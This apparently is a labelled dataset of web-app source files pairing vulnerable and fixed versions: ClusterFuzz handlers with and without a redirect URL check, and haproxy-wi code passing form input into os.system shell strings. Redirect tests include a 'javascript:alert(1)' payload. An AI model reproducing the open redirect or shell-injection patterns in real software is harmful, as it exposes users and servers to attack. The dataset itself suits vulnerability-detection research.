    template = _JINJA_ENVIRONMENT.get_template(path)

    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'text/html'
    self.response.out.write(template.render(values))
    self.response.set_status(status)

  def before_render_json(self, values, status):
    """"""A hook for modifying values before render_json.""""""

  def render_json(self, values, status=200):
    """"""Write JSON response.""""""
    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'application/json'
    self.before_render_json(values, status)
    self.response.out.write(json.dumps(values, cls=JsonEncoder))
    self.response.set_status(status)

  def handle_exception(self, exception, _):
    """"""Catch exception and format it properly.""""""
    try:

      status = 500
      values = {
          'message': exception.message,
          'email': helpers.get_user_email(),
          'traceDump': traceback.format_exc(),
          'status': status,
          'type': exception.__class__.__name__
      }
      if isinstance(exception, helpers.EarlyExitException):
        status = exception.status
        values = exception.to_dict()
      values['params'] = self.request.params.dict_of_lists()

      # 4XX is not our fault. Therefore, we hide the trace dump and log on
      # the INFO level.
      if status >= 400 and status <= 499:
        logging.info(json.dumps(values, cls=JsonEncoder))
        del values['traceDump']
      else:  # Other error codes should be logged with the EXCEPTION level.
        logging.exception(exception)

      if helpers.should_render_json(
          self.request.headers.get('accept', ''),
          self.response.headers.get('Content-Type')):
        self.render_json(values, status)
      else:
        if status == 403 or status == 401:
          self.render_forbidden(exception.message)
        else:
          self.render('error.html', values, status)
    except Exception:
      self.handle_exception_exception()

  def handle_exception_exception(self):
    """"""Catch exception in handle_exception and format it properly.""""""
    exception = sys.exc_info()[1]
    values = {'message': exception.message, 'traceDump': traceback.format_exc()}
    logging.exception(exception)
    if helpers.should_render_json(
        self.request.headers.get('accept', ''),
        self.response.headers.get('Content-Type')):
      self.render_json(values, 500)
    else:
      self.render('error.html', values, 500)

  def redirect(self, url, **kwargs):
    """"""Explicitly converts url to 'str', because webapp2.RequestHandler.redirect
    strongly requires 'str' but url might be an unicode string.""""""
    url = str(url)
    check_redirect_url(url)
    super(Handler, self).redirect(url, **kwargs)


class GcsUploadHandler(Handler):
  """"""A handler which uploads files to GCS.""""""

  def __init__(self, request, response):
    self.initialize(request, response)
    self.upload = None

  def get_upload(self):
    """"""Get uploads.""""""
    if self.upload:
      return self.upload

    upload_key = self.request.get('upload_key')
    if not upload_key:
      return None

    blob_info = storage.GcsBlobInfo.from_key(upload_key)
    if not blob_info:
      raise helpers.EarlyExitException('Failed to upload.', 500)

    self.upload = blob_info
    return self.upload
/n/n/nsrc/appengine/handlers/login.py/n/n# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""Login page.""""""

import datetime

from config import local_config
from handlers import base_handler
from libs import auth
from libs import handler
from libs import helpers
from metrics import logs

SESSION_EXPIRY_DAYS = 14


class Handler(base_handler.Handler):
  """"""Login page.""""""

  @handler.unsupported_on_local_server
  @handler.get(handler.HTML)
  def get(self):
    """"""Handle a get request.""""""
    dest = self.request.get('dest')
    base_handler.check_redirect_url(dest)

    self.render(
        'login.html', {
            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),
            'authDomain': auth.auth_domain(),
            'dest': dest,
        })


class SessionLoginHandler(base_handler.Handler):
  """"""Session login handler.""""""

  @handler.post(handler.JSON, handler.JSON)
  def post(self):
    """"""Handle a post request.""""""
    id_token = self.request.get('idToken')
    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)
    try:
      session_cookie = auth.create_session_cookie(id_token, expires_in)
    except auth.AuthError:
      raise helpers.EarlyExitException('Failed to create session cookie.', 401)

    expires = datetime.datetime.now() + expires_in
    self.response.set_cookie(
        'session',
        session_cookie,
        expires=expires,
        httponly=True,
        secure=True,
        overwrite=True)
    self.render_json({'status': 'success'})


class LogoutHandler(base_handler.Handler):
  """"""Log out handler.""""""

  @handler.unsupported_on_local_server
  @handler.require_csrf_token
  @handler.get(handler.HTML)
  def get(self):
    """"""Handle a get request.""""""
    try:
      auth.revoke_session_cookie(auth.get_session_cookie())
    except auth.AuthError:
      # Even if the revoke failed, remove the cookie.
      logs.log_error('Failed to revoke session cookie.')

    self.response.delete_cookie('session')
    self.redirect(self.request.get('dest'))
/n/n/nsrc/python/tests/appengine/handlers/base_handler_test.py/n/n# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""Tests for the base handler class.""""""

import unittest
import webapp2
import webtest

from handlers import base_handler
from libs import helpers
from tests.test_libs import helpers as test_helpers


class JsonHandler(base_handler.Handler):
  """"""Render JSON response for testing.""""""

  def get(self):
    self.render_json({'test': 'value'})


class HtmlHandler(base_handler.Handler):
  """"""Render HTML response for testing.""""""

  def get(self):
    self.render('test.html', {'test': 'value'})


class ExceptionJsonHandler(base_handler.Handler):
  """"""Render exception in JSON response for testing.""""""

  def get(self):
    self.response.headers['Content-Type'] = 'application/json'
    raise Exception('message')


class ExceptionHtmlHandler(base_handler.Handler):
  """"""Render exception in HTML response for testing.""""""

  def get(self):
    raise Exception('unique_message')


class EarlyExceptionHandler(base_handler.Handler):
  """"""Render EarlyException in JSON for testing.""""""

  def get(self):
    self.response.headers['Content-Type'] = 'application/json'
    raise helpers.EarlyExitException('message', 500, [])


class AccessDeniedExceptionHandler(base_handler.Handler):
  """"""Render forbidden in HTML response for testing.""""""

  def get(self):
    raise helpers.AccessDeniedException('this_random_message')


class RedirectHandler(base_handler.Handler):
  """"""Redirect handler.""""""

  def get(self):
    redirect = self.request.get('redirect')
    self.redirect(redirect)


class HandlerTest(unittest.TestCase):
  """"""Test Handler.""""""

  def setUp(self):
    test_helpers.patch(self, [
        'config.db_config.get_value',
        'libs.form.generate_csrf_token',
        'libs.helpers.get_user_email',
    ])
    self.mock.get_value.return_value = 'contact_string'
    self.mock.generate_csrf_token.return_value = 'csrf_token'
    self.mock.get_user_email.return_value = 'test@test.com'

  def test_render_json(self):
    """"""Ensure it renders JSON correctly.""""""
    app = webtest.TestApp(webapp2.WSGIApplication([('/', JsonHandler)]))
    response = app.get('/')
    self.assertEqual(response.status_int, 200)
    self.assertDictEqual(response.json, {'test': 'value'})

  def test_render_early_exception(self):
    """"""Ensure it renders JSON response for EarlyExitException properly.""""""
    app = webtest.TestApp(
        webapp2.WSGIApplication([('/', EarlyExceptionHandler)]))
    response = app.get('/', expect_errors=True)
    self.assertEqual(response.status_int, 500)
    self.assertEqual(response.json['message'], 'message')
    self.assertEqual(response.json['email'], 'test@test.com')

  def test_render_json_exception(self):
    """"""Ensure it renders JSON exception correctly.""""""
    app = webtest.TestApp(
        webapp2.WSGIApplication([('/', ExceptionJsonHandler)]))
    response = app.get('/', expect_errors=True)
    self.assertEqual(response.status_int, 500)
    self.assertEqual(response.json['message'], 'message')
    self.assertEqual(response.json['email'], 'test@test.com')

  def test_render(self):
    """"""Ensure it gets template and render HTML correctly.""""""
    app = webtest.TestApp(webapp2.WSGIApplication([('/', HtmlHandler)]))
    response = app.get('/')
    self.assertEqual(response.status_int, 200)
    self.assertEqual(response.body, '<html><body>value\n</body></html>')

  def test_render_html_exception(self):
    """"""Ensure it renders HTML exception correctly.""""""
    app = webtest.TestApp(
        webapp2.WSGIApplication([('/', ExceptionHtmlHandler)]))
    response = app.get('/', expect_errors=True)
    self.assertEqual(response.status_int, 500)
    self.assertRegexpMatches(response.body, '.*unique_message.*')
    self.assertRegexpMatches(response.body, '.*test@test.com.*')

  def test_forbidden_not_logged_in(self):
    """"""Ensure it renders forbidden response correctly (when not logged in).""""""
    self.mock.get_user_email.return_value = None

    app = webtest.TestApp(
        webapp2.WSGIApplication([('/', AccessDeniedExceptionHandler)]))
    response = app.get('/', expect_errors=True)
    self.assertEqual(response.status_int, 302)
    self.assertEqual('http://localhost/login?dest=http%3A%2F%2Flocalhost%2F',
                     response.headers['Location'])

  def test_forbidden_logged_in(self):
    """"""Ensure it renders forbidden response correctly (when logged in).""""""
    app = webtest.TestApp(
        webapp2.WSGIApplication([('/', AccessDeniedExceptionHandler)]))
    response = app.get('/', expect_errors=True)
    self.assertEqual(response.status_int, 403)
    self.assertRegexpMatches(response.body, '.*Access Denied.*')
    self.assertRegexpMatches(response.body, '.*this_random_message.*')

  def test_redirect_another_page(self):
    """"""Test redirect to another page.""""""
    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))
    response = app.get('/?redirect=%2Fanother-page')
    self.assertEqual('http://localhost/another-page',
                     response.headers['Location'])

  def test_redirect_another_domain(self):
    """"""Test redirect to another domain.""""""
    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))
    response = app.get('/?redirect=https%3A%2F%2Fblah.com%2Ftest')
    self.assertEqual('https://blah.com/test', response.headers['Location'])

  def test_redirect_javascript(self):
    """"""Test redirect to a javascript url.""""""
    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))
    response = app.get(
        '/?redirect=javascript%3Aalert%281%29', expect_errors=True)
    self.assertEqual(response.status_int, 403)
/n/n/n",0
55,3d66c1146550eecd4e34d47332a8616b435a21fe,"/src/appengine/handlers/base_handler.py/n/n# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""The superclass of all handlers.""""""

from builtins import object
from future import standard_library
standard_library.install_aliases()
import base64
import cgi
import datetime
import json
import logging
import os
import re
import sys
import traceback
import urllib.parse

import jinja2
import webapp2

from base import utils
from config import db_config
from config import local_config
from datastore import ndb
from google_cloud_utils import storage
from libs import auth
from libs import form
from libs import helpers
from system import environment


def add_jinja2_filter(name, fn):
  _JINJA_ENVIRONMENT.filters[name] = fn


class JsonEncoder(json.JSONEncoder):
  """"""Json encoder.""""""
  _EPOCH = datetime.datetime.utcfromtimestamp(0)

  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden
    if isinstance(obj, ndb.Model):
      dict_obj = obj.to_dict()
      dict_obj['id'] = obj.key.id()
      return dict_obj
    elif isinstance(obj, datetime.datetime):
      return int((obj - self._EPOCH).total_seconds())
    elif hasattr(obj, 'to_dict'):
      return obj.to_dict()
    elif isinstance(obj, cgi.FieldStorage):
      return str(obj)
    else:
      raise Exception('Cannot serialise %s' % obj)


def format_time(dt):
  """"""Format datetime object for display.""""""
  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)


def splitlines(text):
  """"""Split text into lines.""""""
  return text.splitlines()


def split_br(text):
  return re.split(r'\s*<br */>\s*', text, flags=re.IGNORECASE)


def encode_json(value):
  """"""Dump base64-encoded JSON string (to avoid XSS).""""""
  return base64.b64encode(json.dumps(value, cls=JsonEncoder))


_JINJA_ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(
        os.path.join(os.path.dirname(__file__), '..', 'templates')),
    extensions=['jinja2.ext.autoescape'],
    autoescape=True)
_MENU_ITEMS = []

add_jinja2_filter('json', encode_json)
add_jinja2_filter('format_time', format_time)
add_jinja2_filter('splitlines', splitlines)
add_jinja2_filter('split_br', split_br)
add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)


def add_menu(name, href):
  """"""Add menu item to the main navigation.""""""
  _MENU_ITEMS.append(_MenuItem(name, href))


def make_login_url(dest_url):
  """"""Make the switch account url.""""""
  return '/login?' + urllib.parse.urlencode({'dest': dest_url})


def make_logout_url(dest_url):
  """"""Make the switch account url.""""""
  return '/logout?' + urllib.parse.urlencode({
      'csrf_token': form.generate_csrf_token(),
      'dest': dest_url,
  })


class _MenuItem(object):
  """"""A menu item used for rendering an item in the main navigation.""""""

  def __init__(self, name, href):
    self.name = name
    self.href = href


class Handler(webapp2.RequestHandler):
  """"""A superclass for all handlers. It contains many convenient methods.""""""

  def is_cron(self):
    """"""Return true if the request is from a cron job.""""""
    return bool(self.request.headers.get('X-Appengine-Cron'))

  def render_forbidden(self, message):
    """"""Write HTML response for 403.""""""
    login_url = make_login_url(dest_url=self.request.url)
    user_email = helpers.get_user_email()
    if not user_email:
      self.redirect(login_url)
      return

    contact_string = db_config.get_value('contact_string')
    template_values = {
        'message': message,
        'user_email': helpers.get_user_email(),
        'login_url': login_url,
        'switch_account_url': login_url,
        'logout_url': make_logout_url(dest_url=self.request.url),
        'contact_string': contact_string,
    }
    self.render('error-403.html', template_values, 403)

  def _add_security_response_headers(self):
    """"""Add security-related headers to response.""""""
    self.response.headers['Strict-Transport-Security'] = (
        'max-age=2592000; includeSubdomains')
    self.response.headers['X-Content-Type-Options'] = 'nosniff'
    self.response.headers['X-Frame-Options'] = 'deny'

  def render(self, path, values=None, status=200):
    """"""Write HTML response.""""""
    if values is None:
      values = {}

    values['menu_items'] = _MENU_ITEMS
    values['is_oss_fuzz'] = utils.is_oss_fuzz()
    values['is_development'] = (
        environment.is_running_on_app_engine_development())
    values['is_logged_in'] = bool(helpers.get_user_email())

    # Only track analytics for non-admin users.
    values['ga_tracking_id'] = (
        local_config.GAEConfig().get('ga_tracking_id')
        if not auth.is_current_user_admin() else None)

    if values['is_logged_in']:
      values['switch_account_url'] = make_login_url(self.request.url)
      values['logout_url'] = make_logout_url(dest_url=self.request.url)

    template = _JINJA_ENVIRONMENT.get_template(path)

    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'text/html'
    self.response.out.write(template.render(values))
    self.response.set_status(status)

  def before_render_json(self, values, status):
    """"""A hook for modifying values before render_json.""""""

  def render_json(self, values, status=200):
    """"""Write JSON response.""""""
    self._add_security_response_headers()
    self.response.headers['Content-Type'] = 'application/json'
    self.before_render_json(values, status)
    self.response.out.write(json.dumps(values, cls=JsonEncoder))
    self.response.set_status(status)

  def handle_exception(self, exception, _):
    """"""Catch exception and format it properly.""""""
    try:

      status = 500
      values = {
          'message': exception.message,
          'email': helpers.get_user_email(),
          'traceDump': traceback.format_exc(),
          'status': status,
          'type': exception.__class__.__name__
      }
      if isinstance(exception, helpers.EarlyExitException):
        status = exception.status
        values = exception.to_dict()
      values['params'] = self.request.params.dict_of_lists()

      # 4XX is not our fault. Therefore, we hide the trace dump and log on
      # the INFO level.
      if status >= 400 and status <= 499:
        logging.info(json.dumps(values, cls=JsonEncoder))
        del values['traceDump']
      else:  # Other error codes should be logged with the EXCEPTION level.
        logging.exception(exception)

      if helpers.should_render_json(
          self.request.headers.get('accept', ''),
          self.response.headers.get('Content-Type')):
        self.render_json(values, status)
      else:
        if status == 403 or status == 401:
          self.render_forbidden(exception.message)
        else:
          self.render('error.html', values, status)
    except Exception:
      self.handle_exception_exception()

  def handle_exception_exception(self):
    """"""Catch exception in handle_exception and format it properly.""""""
    exception = sys.exc_info()[1]
    values = {'message': exception.message, 'traceDump': traceback.format_exc()}
    logging.exception(exception)
    if helpers.should_render_json(
        self.request.headers.get('accept', ''),
        self.response.headers.get('Content-Type')):
      self.render_json(values, 500)
    else:
      self.render('error.html', values, 500)

  def redirect(self, url, **kwargs):
    """"""Explicitly converts url to 'str', because webapp2.RequestHandler.redirect
    strongly requires 'str' but url might be an unicode string.""""""
    super(Handler, self).redirect(str(url), **kwargs)


class GcsUploadHandler(Handler):
  """"""A handler which uploads files to GCS.""""""

  def __init__(self, request, response):
    self.initialize(request, response)
    self.upload = None

  def get_upload(self):
    """"""Get uploads.""""""
    if self.upload:
      return self.upload

    upload_key = self.request.get('upload_key')
    if not upload_key:
      return None

    blob_info = storage.GcsBlobInfo.from_key(upload_key)
    if not blob_info:
      raise helpers.EarlyExitException('Failed to upload.', 500)

    self.upload = blob_info
    return self.upload
/n/n/n/src/appengine/handlers/login.py/n/n# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
""""""Login page.""""""

import datetime

from config import local_config
from handlers import base_handler
from libs import auth
from libs import handler
from libs import helpers
from metrics import logs

SESSION_EXPIRY_DAYS = 14


class Handler(base_handler.Handler):
  """"""Login page.""""""

  @handler.unsupported_on_local_server
  @handler.get(handler.HTML)
  def get(self):
    """"""Handle a get request.""""""
    self.render(
        'login.html', {
            'apiKey': local_config.ProjectConfig().get('firebase.api_key'),
            'authDomain': auth.auth_domain(),
            'dest': self.request.get('dest'),
        })


class SessionLoginHandler(base_handler.Handler):
  """"""Session login handler.""""""

  @handler.post(handler.JSON, handler.JSON)
  def post(self):
    """"""Handle a post request.""""""
    id_token = self.request.get('idToken')
    expires_in = datetime.timedelta(days=SESSION_EXPIRY_DAYS)
    try:
      session_cookie = auth.create_session_cookie(id_token, expires_in)
    except auth.AuthError:
      raise helpers.EarlyExitException('Failed to create session cookie.', 401)

    expires = datetime.datetime.now() + expires_in
    self.response.set_cookie(
        'session',
        session_cookie,
        expires=expires,
        httponly=True,
        secure=True,
        overwrite=True)
    self.render_json({'status': 'success'})


class LogoutHandler(base_handler.Handler):
  """"""Log out handler.""""""

  @handler.unsupported_on_local_server
  @handler.require_csrf_token
  @handler.get(handler.HTML)
  def get(self):
    """"""Handle a get request.""""""
    try:
      auth.revoke_session_cookie(auth.get_session_cookie())
    except auth.AuthError:
      # Even if the revoke failed, remove the cookie.
      logs.log_error('Failed to revoke session cookie.')

    self.response.delete_cookie('session')
    self.redirect(self.request.get('dest'))
/n/n/n",1
56,ba79e7301c5574b91b719298c56fd5129c46cca3,"app/config.py/n/n#!/usr/bin/env python3
import cgi
import os
import http.cookies
import funct
import sql
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader('templates/'), autoescape=True)
template = env.get_template('config.html')

print('Content-type: text/html\n')
funct.check_login()

form = cgi.FieldStorage()
serv = form.getvalue('serv')
config_read = """"
cfg = """"
stderr = """"
error = """"
aftersave = """"

try:
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')
	user = sql.get_user_name_by_uuid(user_id.value)
	servers = sql.get_dick_permit()
	token = sql.get_token(user_id.value)
	role = sql.get_user_role_by_uuid(user_id.value)
except:
	pass

hap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')

if serv is not None:
	cfg = hap_configs_dir + serv + ""-"" + funct.get_data('config') + "".cfg""

if serv is not None and form.getvalue('open') is not None :
	
	try:
		funct.logging(serv, ""config.py open config"")
	except:
		pass
	
	error = funct.get_config(serv, cfg)
	
	try:
		conf = open(cfg, ""r"")
		config_read = conf.read()
		conf.close
	except IOError:
		error += '<br />Can\'t read import config file'

	os.system(""/bin/mv %s %s.old"" % (cfg, cfg))	

if serv is not None and form.getvalue('config') is not None:
	try:
		funct.logging(serv, ""config.py edited config"")
	except:
		pass
		
	config = form.getvalue('config')
	oldcfg = form.getvalue('oldconfig')
	save = form.getvalue('save')
	aftersave = 1
	try:
		with open(cfg, ""a"") as conf:
			conf.write(config)
	except IOError:
		error = ""Can't read import config file""
	
	MASTERS = sql.is_master(serv)
	for master in MASTERS:
		if master[0] != None:
			funct.upload_and_restart(master[0], cfg, just_save=save)
		
	stderr = funct.upload_and_restart(serv, cfg, just_save=save)
		
	funct.diff_config(oldcfg, cfg)
	
	#if save:
	#	c = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	#	c[""restart""] = form.getvalue('serv')
	#	print(c)
		
	os.system(""/bin/rm -f "" + hap_configs_dir + ""*.old"")


template = template.render(h2 = 1, title = ""Working with HAProxy configs"",
							role = role,
							action = ""config.py"",
							user = user,
							select_id = ""serv"",
							serv = serv,
							aftersave = aftersave,
							config = config_read,
							cfg = cfg,
							selects = servers,
							stderr = stderr,
							error = error,
							note = 1,
							token = token)
print(template)/n/n/napp/funct.py/n/n# -*- coding: utf-8 -*-""
import cgi
import os, sys

form = cgi.FieldStorage()
serv = form.getvalue('serv')

def get_app_dir():
	d = sys.path[0]
	d = d.split('/')[-1]		
	return sys.path[0] if d == ""app"" else os.path.dirname(sys.path[0])	

def get_config_var(sec, var):
	from configparser import ConfigParser, ExtendedInterpolation
	try:
		path_config = get_app_dir()+""/haproxy-wi.cfg""
		config = ConfigParser(interpolation=ExtendedInterpolation())
		config.read(path_config)
	except:
		print('Content-type: text/html\n')
		print('<center><div class=""alert alert-danger"">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')
	try:
		return config.get(sec, var)
	except:
		print('Content-type: text/html\n')
		print('<center><div class=""alert alert-danger"">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))
					
def get_data(type):
	from datetime import datetime
	from pytz import timezone
	import sql
	now_utc = datetime.now(timezone(sql.get_setting('time_zone')))
	if type == 'config':
		fmt = ""%Y-%m-%d.%H:%M:%S""
	if type == 'logs':
		fmt = '%Y%m%d'
	if type == ""date_in_log"":
		fmt = ""%b %d %H:%M:%S""
		
	return now_utc.strftime(fmt)
			
def logging(serv, action, **kwargs):
	import sql
	import http.cookies
	log_path = get_config_var('main', 'log_path')
	login = ''
	
	if not os.path.exists(log_path):
		os.makedirs(log_path)
		
	try:
		IP = cgi.escape(os.environ[""REMOTE_ADDR""])
		cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
		user_uuid = cookie.get('uuid')
		login = sql.get_user_name_by_uuid(user_uuid.value)
	except:
		pass
		
	if kwargs.get('alerting') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/checker-""+get_data('logs')+"".log"", ""a"")
	elif kwargs.get('metrics') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/metrics-""+get_data('logs')+"".log"", ""a"")
	elif kwargs.get('keep_alive') == 1:
		mess = get_data('date_in_log') + action + ""\n""
		log = open(log_path + ""/keep_alive-""+get_data('logs')+"".log"", ""a"")
	else:
		mess = get_data('date_in_log') + "" from "" + IP + "" user: "" + login + "" "" + action + "" for: "" + serv + ""\n""
		log = open(log_path + ""/config_edit-""+get_data('logs')+"".log"", ""a"")
	try:	
		log.write(mess)
		log.close
	except IOError as e:
		print('<center><div class=""alert alert-danger"">Can\'t write log. Please check log_path in config %e</div></center>' % e)
		pass
	
def telegram_send_mess(mess, **kwargs):
	import telebot
	from telebot import apihelper
	import sql
	
	telegrams = sql.get_telegram_by_ip(kwargs.get('ip'))
	proxy = sql.get_setting('proxy')
	
	for telegram in telegrams:
		token_bot = telegram[1]
		channel_name = telegram[2]
			
	if proxy is not None:
		apihelper.proxy = {'https': proxy}
	try:
		bot = telebot.TeleBot(token=token_bot)
		bot.send_message(chat_id=channel_name, text=mess)
	except:
		print(""Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group"")
		sys.exit()
	
def check_login(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_uuid = cookie.get('uuid')
	ref = os.environ.get(""SCRIPT_NAME"")

	sql.delete_old_uuid()
	
	if user_uuid is not None:
		sql.update_last_act_user(user_uuid.value)
		if sql.get_user_name_by_uuid(user_uuid.value) is None:
			print('<meta http-equiv=""refresh"" content=""0; url=login.py?ref=%s"">' % ref)
	else:
		print('<meta http-equiv=""refresh"" content=""0; url=login.py?ref=%s"">' % ref)
				
def is_admin(**kwargs):
	import sql
	import http.cookies
	cookie = http.cookies.SimpleCookie(os.environ.get(""HTTP_COOKIE""))
	user_id = cookie.get('uuid')
	try:
		role = sql.get_user_role_by_uuid(user_id.value)
	except:
		role = 3
		pass
	level = kwargs.get(""level"")
		
	if level is None:
		level = 1
		
	try:
		return True if role <= level else False
	except:
		return False
		pass

def page_for_admin(**kwargs):
	give_level = 1
	give_level = kwargs.get(""level"")
		
	if not is_admin(level=give_level):
		print('<center><h3 style=""color: red"">How did you get here?! O_o You do not have need permissions</h>')
		print('<meta http-equiv=""refresh"" content=""5; url=/"">')
		import sys
		sys.exit()
				
def ssh_connect(serv, **kwargs):
	import paramiko
	from paramiko import SSHClient
	import sql
	fullpath = get_config_var('main', 'fullpath')
	ssh_enable = ''
	ssh_port = ''
	ssh_user_name = ''
	ssh_user_password = ''
	
	for sshs in sql.select_ssh(serv=serv):
		ssh_enable = sshs[3]
		ssh_user_name = sshs[4]
		ssh_user_password = sshs[5]
		ssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]

	servers = sql.select_servers(server=serv)
	for server in servers:
		ssh_port = server[10]

	ssh = SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		if ssh_enable == 1:
			k = paramiko.RSAKey.from_private_key_file(ssh_key_name)
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)
		else:
			ssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)
		return ssh
	except paramiko.AuthenticationException:
		return 'Authentication failed, please verify your credentials'
		pass
	except paramiko.SSHException as sshException:
		return 'Unable to establish SSH connection: %s ' % sshException
		pass
	except paramiko.BadHostKeyException as badHostKeyException:
		return 'Unable to verify server\'s host key: %s ' % badHostKeyException
		pass
	except Exception as e:
		if e == ""No such file or directory"":
			return '%s. Check ssh key' % e
			pass
		elif e == ""Invalid argument"":
			error = 'Check the IP of the server'
			pass
		else:
			error = e	
			pass
		return str(error)

def get_config(serv, cfg, **kwargs):
	import sql

	config_path = ""/etc/keepalived/keepalived.conf"" if kwargs.get(""keepalived"") else sql.get_setting('haproxy_config_path')	
	ssh = ssh_connect(serv)
	try:
		sftp = ssh.open_sftp()
		sftp.get(config_path, cfg)
		sftp.close()
		ssh.close()
	except Exception as e:
		ssh = str(e)
		return ssh
	
def diff_config(oldcfg, cfg):
	log_path = get_config_var('main', 'log_path')
	diff = """"
	date = get_data('date_in_log') 
	cmd=""/bin/diff -ub %s %s"" % (oldcfg, cfg)
	
	output, stderr = subprocess_execute(cmd)
	
	for line in output:
		diff += date + "" "" + line + ""\n""
	try:		
		log = open(log_path + ""/config_edit-""+get_data('logs')+"".log"", ""a"")
		log.write(diff)
		log.close
	except IOError:
		print('<center><div class=""alert alert-danger"">Can\'t read write change to log. %s</div></center>' % stderr)
		pass
		
def install_haproxy(serv, **kwargs):
	import sql
	script = ""install_haproxy.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	stats_port = sql.get_setting('stats_port')
	server_state_file = sql.get_setting('server_state_file')
	stats_user = sql.get_setting('stats_user')
	stats_password = sql.get_setting('stats_password')
	proxy = sql.get_setting('proxy')
	os.system(""cp scripts/%s ."" % script)
	
	proxy_serv = proxy if proxy is not None else """"
		
	commands = [ ""sudo chmod +x ""+tmp_config_path+script+"" && "" +tmp_config_path+""/""+script +"" PROXY="" + proxy_serv+ 
				"" SOCK_PORT=""+haproxy_sock_port+"" STAT_PORT=""+stats_port+"" STAT_FILE=""+server_state_file+
				"" STATS_USER=""+stats_user+"" STATS_PASS=""+stats_password ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
		
	os.system(""rm -f %s"" % script)
	ssh_command(serv, commands, print_out=""1"")
	
	if kwargs.get('syn_flood') == ""1"":
		syn_flood_protect(serv)
	
def syn_flood_protect(serv, **kwargs):
	import sql
	script = ""syn_flood_protect.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	
	enable = ""disable"" if kwargs.get('enable') == ""0"" else ""disable""

	os.system(""cp scripts/%s ."" % script)
	
	commands = [ ""sudo chmod +x ""+tmp_config_path+script, tmp_config_path+script+ "" ""+enable ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system(""rm -f %s"" % script)
	ssh_command(serv, commands, print_out=""1"")
	
def waf_install(serv, **kwargs):
	import sql
	script = ""waf.sh""
	tmp_config_path = sql.get_setting('tmp_config_path')
	proxy = sql.get_setting('proxy')
	haproxy_dir = sql.get_setting('haproxy_dir')
	ver = check_haproxy_version(serv)

	os.system(""cp scripts/%s ."" % script)
	
	commands = [ ""sudo chmod +x ""+tmp_config_path+script+"" && "" +tmp_config_path+script +"" PROXY="" + proxy+ 
				"" HAPROXY_PATH=""+haproxy_dir +"" VERSION=""+ver ]
	
	error = str(upload(serv, tmp_config_path, script))
	if error:
		print('error: '+error)
	os.system(""rm -f %s"" % script)
	
	stderr = ssh_command(serv, commands, print_out=""1"")
	if stderr is None:
		sql.insert_waf_metrics_enable(serv, ""0"")

def check_haproxy_version(serv):
	import sql
	haproxy_sock_port = sql.get_setting('haproxy_sock_port')
	ver = """"
	cmd=""echo 'show info' |nc %s %s |grep Version |awk '{print $2}'"" % (serv, haproxy_sock_port)
	output, stderr = subprocess_execute(cmd)
	for line in output:
		ver = line
	return ver
	
def upload(serv, path, file, **kwargs):
	error = """"
	full_path = path + file

	if kwargs.get('dir') == ""fullpath"":
		full_path = path
	
	try:
